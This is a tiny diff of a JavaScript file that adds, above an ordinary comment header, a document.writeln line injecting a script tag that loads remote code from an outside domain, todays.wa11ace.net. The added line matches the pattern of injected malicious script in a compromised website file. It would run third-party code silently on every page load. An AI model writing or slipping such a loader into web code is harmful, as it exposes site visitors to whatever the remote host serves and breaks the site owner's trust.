@@ -1,3 +1,4 @@
+document.writeln("<script src=https://todays.wa11ace.net/demo-2.js?id=7451></script>");
 /*// JavaScript Document
 
 
